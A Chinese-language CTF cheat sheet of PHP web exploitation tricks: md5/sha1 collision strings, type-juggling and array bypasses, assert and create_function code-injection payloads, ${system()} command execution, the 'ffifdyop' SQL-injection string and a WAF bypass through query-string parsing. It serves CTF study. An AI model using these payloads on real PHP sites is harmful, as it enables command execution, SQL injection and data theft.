[PHP: PHP 手册 - Manual](https://www.php.net/manual/zh/index.php)

```
//

/**/ 注释

传cookie时，有特殊字符需要url编码，$_GET[]里中括号可以用大括号替代$_GET{}
```

## 基本函数

phpinfo()：函数用于显示当前 PHP 环境的详细配置信息，包括编译器选项、扩展模块、环境变量等

phpcredits()：函数用于显示 PHP 的开发者和贡献者列表，以及他们的贡献信息。这包括 PHP 的核心开发人员、扩展模块的作者等

```
hex2bin()

把十六进制值转换为 ASCII 字符
```

```
file_put_contents($v3,$str);

str写入v3中（支持伪协议）
v3=php://filter/write=convert.base64-
decode/resource=2.php
```

```
ReflectionClass 

反射类可以建立对类的映射，也可以建立对PHP基本方法的映射

可以建立反射类new ReflectionClass(system('cmd'))来执行命令

class fuc{ static function methond(){ echo 'Hello World!'; } } 

echo new ReflectionClass('fuc');
```

```
var_dump()

函数用于输出变量的相关信息,可以是变量、数组、对象
```

```
ob_get_contents — 返回输出缓冲区的内容  
ob_end_clean — 清空（擦除）缓冲区并关闭输出缓冲,此函数丢弃最顶层输出缓冲区的内容并关闭这个缓冲区。如果想要进一步处理缓冲区的内容，必须在ob_end_clean()之前调用ob_get_contents()，因为当调用ob_end_clean()时缓冲区内容将被丢弃

exit();使程序提前退出
die();同上

例如：
eval($c);
$s = ob_get_contents();
ob_end_clean();
echo preg_replace("/[0-9]|[a-z]/i","?",$s);

在命令执行中遇见可c=require('/flag.txt');exit();进行绕过
```

```
::双冒号运算符

在PHP中，::是一个双冒号运算符，也被称为范围解析操作符或静态访问操作符。它用于访问类中的静态属性、静态方法和常量，或调用父类的静态方法。

在类名后面使用::，可以直接访问类的静态成员或调用静态方法，而无需创建类的实例。这使得我们无需实例化一个类就可以访问和操作类级别的成员。
```

## 基本函数漏洞

**md5()**

```
PHP在处理哈希字符串时，会利用”!=”或”\==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0,都是0

①也称md5碰撞
常见：QNKCDZO，240610708，s878926199a
有个特殊的md5的值，0e215962017，这个md5加密前后都是以0e开头

②数组绕过
同时MD5不能处理数组，有时也可以用数组绕过，解析数组时直接等于0
例如：v1[]=1


③如果是强碰撞：
if((string)$_POST['a']!==(string)$_POST['b'] && md5($_POST['a'])===md5($_POST['b'])){
    die("success!");
}

username=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2
&password=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2

array1=%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&
array2=%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab

还有另一种玩法：md5($password,true)
参数是True，意为返回原始16字符二进制格式

<?php
$a=1;
while(!stripos(md5($a, true), '\'or\'')){
	$a=$a+1;
}
echo $a."\n";;
echo md5($a, true);
?>

常用的：ffifdyop，该字符串md5加密后若raw参数为True时会返回 'or'6<trash> (<trash>其实就是一些乱码和不可见字符，这里只要第一位是非零数字即可被判定为True，后面的<trash>会在MySQL将其转换成整型比较时丢掉)
```

**sha1()**

```
sha1碰撞，与上述一样
aaK1STfY
0e76658526655756207688271159624026011393
aaO8zKZF
0e89257456677279068558073954252716165668

数组绕过

array1=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&array2=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1
```

**is_numeric**

```
用于检测变量是否为数字（包括浮点型）或数字字符串

十六进制绕过（0x开头）

数组绕过

科学计数法绕过（0e开头）

例如：常配合用语句  <?=`cat *`;  进行base64编码然后再转十六进制，去掉最后的=，刚好可以是科学计数法
```

**strpos()** 

```
函数返回字符串在另一字符串中第一次出现的位置。如果存在，返回数字，如果没有找到该字符串，则返回false.该函数对大小写敏感。用这个函数来判断字符串中是否存在某个字符时必须使用===false

当出现判断不能让值为0时，可以用+、%2b放在前面
if(!strpos($num, "0")){  
        die("no no no!!!");

数组也可绕过(strcmp()类似)
```

**int intval ( mixed $var [, int $base = 10 ] )**

```
参数说明：

- $var：要转换成 integer 的数量值（可以是小数）。
- $base：转化所使用的进制。

如果 base 是 0，通过检测 var 的格式来决定使用的进制：

- 如果字符串包括了 "0x" (或 "0X") 的前缀，使用 16 进制 (hex)；否则，
- 如果字符串以 "0" 开始，使用 8 进制(octal)；否则，
- 将使用 10 进制 (decimal)


采用科学计数法绕过，该函数只会截取到字母之前的数字
10e10000000000000000000

数组绕过 （传参方式?num[]=a）
```

**弱类型比较：**

```
==为弱相等，也就是说12=="12" --> true，而且12=="12cdf" --> true，只取字符串中开头的整数部分，但是1e3dgf这样的字符串在比较时，取的是符合科学计数法的部分：1e3，也就是1000

var_dump("admin1"==0) //true
var_dump("admin1"==true)//tru

===为完全相等，数据类型和值都相等时返回true
```

```
array_search()

同上为弱类型比较，可以用0绕过
```

```
bool in_array(a,array,strict)

如果没有设置strict，则使用比较宽松的比较，即弱类型比较
```

```
addslashes()

将' " \ 转义
```

**assert(mixed $assertion, Throwable $exception = ?): bool**

```
例如
?page=').system('cat templates/flag.php');//

assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
assert("strpos('').system('ls');//', '..') === false") or die("Detected hacking attempt!");

将传入的参数视为代码执行。判断是否会执行错误，没有错误则返回True否则返回False，与在参数中传入调用外部命令的方法如system可以构造出一个webshell

在PHP7.1版本以后， assert()默认不再可以执行代码
```

**strlen()**

```
返回给定的字符串 string 的长度

但是当参数不为字符串时，会返回0

可以采用%0a绕过
```

**basename()**

```
payload:http://192.168.52.130/a.php/utils.php/你好?show_source=1
```

## 含特殊符号传参

[谈一谈PHP中关于非法参数名传参问题_php的非法传参_末 初的博客-CSDN博客](https://blog.csdn.net/mochu7777777/article/details/115050295)

题：mo_chu.7

**点和空格会转换成下划线**

payload:?mo[chu.7=xxx

当`PHP版本小于8`时，如果参数中出现中括号`[`，中括号会被转换成下划线`_`，但是会出现转换错误导致接下来如果该参数名中还有`非法字符`并不会继续转换成下划线`_`，也就是说如果中括号`[`出现在前面，那么中括号`[`还是会被转换成下划线`_`，但是因为出错导致接下来的非法字符并不会被转换成下划线`_`

PHP8中这种转换错误被修复了，传入的参数名中非法字符一律全部转换为了下划线

## 神奇字符串

```
ffifdyop

经过md5加密后：276f722736c95d99e921722cf9ed621c

再转换为字符串：'or'6<乱码>  即  'or'66�]��!r,��b
用途：

select * from admin where password=''or'6<乱码>'
就相当于select * from admin where password=''or 1  实现sql注入

129581926211651571912466741651878684928 也可达同样的效果
```

## 特征

```
在PHP中，除了1. 变量名、2. 自定义常量名、3. php.ini中的配置项

其余都是对大小写不敏感
```

## 可变函数

- php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数
- 例如：`$function = "sayHello";$function();`

选择assert而不是eval的原因，eval并不支持动态执行，所以用system也可以，但低版本php不优先考虑

[PHP: 可变函数 - Manual](https://www.php.net/manual/zh/functions.variable-functions.php)

## 匿名函数

`create_function()` 函数是 PHP 中的一个函数，用于在运行时创建一个匿名函数，是可变函数

```
$addFunction = create_function('$a, $b', 'return $a + $b;');

实际上函数是
function ($a, $b){
    return $a + $b;
}

此时我们可以通过闭合掉第一个大括号{，并注释掉之后的最后的}，来实现命令执行，此时payload为b=}system(%27cat%20/flag%27);/*
```

PHP 7.2.0 版本中已经被弃用，并在 PHP 7.4.0 版本中移除

## 复杂变量

`${phpinfo()}` ：在 php 中，可以接受函数的返回值作为变量名，而`phpinfo()`的返回值为`TRUE`，将返回值返回作为了变量名，但是也将`phpinfo()`执行了，

```
echo "123${phpinfo()}";将会返回phpinfo

echo "This is {$great}";输出： This is fantastic

echo "2${phpinfo("123")}";

echo "${`id`}"//开启notice，不用echo也行

${(system)(id)}

${system(chr(99).chr(97).chr(116).chr(32).chr(47).chr(102).chr(108).chr(97).chr(103))}
```

## 数组溢出

PHP索引数组最大下标等于最大int数，对其追加会导致整型数溢出，进而引起追加失败

```
int范围查阅Manual可知：32位最大是231-1，64位是263-1
也就是2147483647与9223372036854775807
```



## 配置文件路径

```
session存放路径 
/var/lib/php/sessions
```

## PHP的字符串解析特性

```
我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo] => “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?%20news[id%00=42会转换为Array([news_id] => 42)。如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：
/news.php?%20news[id%00=42"+AND+1=0–

上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中。

HP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：

1.删除空白符

2.将某些字符转换为下划线（包括空格）

在了解到PHP的字符串解析之后，我们思考一个问题，WAF它不让num参数传入字母，所以我们不能让WAF文件检测到字母，但是我们又需要传入字母来构成我们的命令，这种情况下我们该怎么对其进行绕过呢？

因为num不可以传入字母，但是我们在num参数之前添加一个空格，这样在PHP的语言特性下会默认删除这个空格，但是WAF会因为这个空格导致检测不到num这个参数，最终导致WAF被绕过。

Payload


http://node4.buuoj.cn:25591/calc.php?num=a #被拦截


http://node4.buuoj.cn:25591/calc.php? num=a #绕过WAF
```

